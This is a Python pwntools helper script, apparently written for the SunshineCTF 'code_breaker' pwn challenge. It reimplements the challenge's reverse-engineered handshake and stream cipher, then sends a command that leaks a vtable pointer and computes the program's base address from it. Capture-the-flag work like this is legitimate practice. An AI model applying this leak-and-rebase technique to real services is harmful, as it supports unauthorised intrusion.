#!/usr/bin/env python3
# Protocol helper for code_breaker (SunshineCTF pwn6) - reverse engineered.
from pwn import *
import struct, sys

context.arch = 'amd64'
context.log_level = 'info'

HERE = os.path.dirname(os.path.abspath(__file__))

def load_sbox():
    data = open(os.path.join(HERE, 'code_breaker'), 'rb').read()
    # .rodata file offset == vaddr == 0x2000 here
    return data[0x2040:0x2140]

S = load_sbox()

def rol8(v, n):
    return ((v << n) | (v >> (8 - n))) & 0xff

class CB:
    def __init__(self, io):
        self.io = io
        self.rx = 0      # recv stream counter (0x42c0) = absolute offset of next byte we SEND
        self.tx = 0      # send stream counter (0x42c4) = absolute offset of next byte we READ
        self.K = None

    # ---------- raw length prefixed ----------
    def raw_send(self, payload):
        self.io.send(p16(len(payload), endian='big') + payload)

    def raw_recv(self):
        hdr = self.io.recvn(2)
        n = struct.unpack('>H', hdr)[0]
        if n == 0:
            return b''
        return self.io.recvn(n)

    # ---------- stream cipher ----------
    def ks(self, off, n):
        # off = absolute stream counter at the START of the message,
        # i   = byte index inside the message (K index uses i&0xf, NOT off+i)
        return bytes(S[(off + i + self.K[i & 0xf]) & 0xff] for i in range(n))

    def enc(self, data, off):
        return xor(data, self.ks(off, len(data)))

    def dec(self, data, off):
        return self.enc(data, off)

    # ---------- handshake ----------
    def handshake(self):
        m = self.raw_recv()
        assert m[0] == 1, m[:4]
        Ns = m[1:17]
        Nc = os.urandom(16)
        self.raw_send(bytes([2]) + Nc)
        self.K = self.derive(Ns, Nc)
        V = bytes(S[self.K[i]] ^ self.K[(i + 5) & 0xf] for i in range(16))
        self.raw_send(self.enc(bytes([3]) + V, 0))
        self.rx = 17
        r = self.raw_recv()
        dec = self.dec(r, 0)
        self.tx = 2
        if dec[:1] != b'\x04':
            raise Exception('handshake failed %r' % dec)
        return dec

    @staticmethod
    def derive(Ns, Nc):
        K = bytearray(16)
        buf = Ns + Nc
        for r in range(4):
            for j in range(16):
                i1 = (j + 8 * r) & 0x1f
                i2 = 3 * r + j
                K[j] = rol8(S[buf[i1] ^ K[j]] ^ buf[i2], 3)
        return bytes(K)

    # ---------- encrypted command layer ----------
    def cmd(self, payload):
        self.raw_send(self.enc(payload, self.rx))
        self.rx += len(payload)

    def resp(self, timeout=None):
        r = self.raw_recv()
        d = self.dec(r, self.tx)
        self.tx += len(r)
        return d

    def rt(self, payload):
        self.cmd(payload)
        return self.resp()


def start(local=True):
    if local:
        p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './code_breaker'],
                    cwd=HERE)
    else:
        p = remote('chal.sunshinectf.games', 26005)
    return p


if __name__ == '__main__':
    context.log_level = 'debug'
    p = start(local=(len(sys.argv) < 2))
    cb = CB(p)
    print('hs:', cb.handshake())
    # command 0x16: dump vtable @ 0x40c0 (0xf2 bytes)
    d = cb.rt(bytes([0x16]))
    print('0x16 len', len(d), d[:16].hex())
    ptr = u64(d[2:10])
    print('leaked ptr', hex(ptr), '=> base', hex(ptr - 0x1390))
    if len(sys.argv) < 2:
        maps = open('/proc/%d/maps' % p.pid).read().splitlines()
        print([l for l in maps if 'code_breaker' in l][:2])
    p.close()
